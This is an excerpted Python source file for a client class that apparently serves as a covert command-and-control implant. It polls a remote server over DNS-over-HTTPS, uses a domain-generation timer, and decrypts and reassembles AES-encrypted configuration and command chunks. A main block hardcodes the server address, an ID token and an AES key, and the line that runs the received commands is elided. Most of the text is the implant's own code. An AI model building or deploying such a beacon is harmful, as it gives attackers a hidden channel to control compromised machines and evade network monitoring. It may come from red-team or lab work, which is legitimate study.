# pyinstaller --onefile DOH_AES.py
...
class DOH_Client:
    def __init__(self, server_url, id_token, aes_key, user_agent=None, uris=None, dga_timer=300):
        self.server_url = server_url.rstrip("/")
        self.id_token = id_token.strip().lower()
        self.aes_key = aes_key
        self.cipher = AESCipherHttp(aes_key)
    ...
    def is_spoof_txt(self, txt):
        txt_lower = txt.lower()
        if any(txt_lower.startswith(p) for p in ["enc:", "cb:", "cmd_info:", "cmd_complete:", "dga=", "cfg:", "cfg_info:"]):
            return False
    ...
    def parse_init_payload(self, txt):
        try:
            if txt.startswith("ENC:"):
                ...
                try:
                    txt = self.cipher.decrypt(encrypted_data)
                except Exception:
                    return
    ...
    def parse_config_part(self, txt):
        try:
            ...
            if cfg_data['received_count'] == cfg_data['total']:
                ...
                full_encrypted_bytes = base64.urlsafe_b64decode(full_encoded)
                encrypted_config_b64 = full_encrypted_bytes.decode('utf-8')
                calculated = hashlib.sha256(full_encrypted_bytes).hexdigest()[:8]
    ...
    def apply_config_payload(self, encrypted_config_b64):
        try:
            decrypted_config = self.cipher.decrypt(encrypted_config_b64)
        ...
        try:
            ...
            if checksum in self.command_parts:
                ...
                if cmd_data['received_count'] == cmd_data['total']:
                    ...
                    try:
                        full_encrypted_cmd = b64decode(full_encoded).decode('utf-8')
                        encrypted_bytes = full_encrypted_cmd.encode('utf-8')
                        calculated_checksum = hashlib.sha256(encrypted_bytes).hexdigest()[:8]

                        if calculated_checksum == checksum:
                            full_command = self.cipher.decrypt(full_encrypted_cmd)
...
if __name__ == "__main__":
    server_url = "https://192.168.1.107:2222"
    id_token = "cbbce2bc-ff85-4f64-88fc-91612f679757"
    aes_key = "1234567890123456"

    client = DOH_Client(server_url, id_token, aes_key, dga_timer=5)
    client.run()
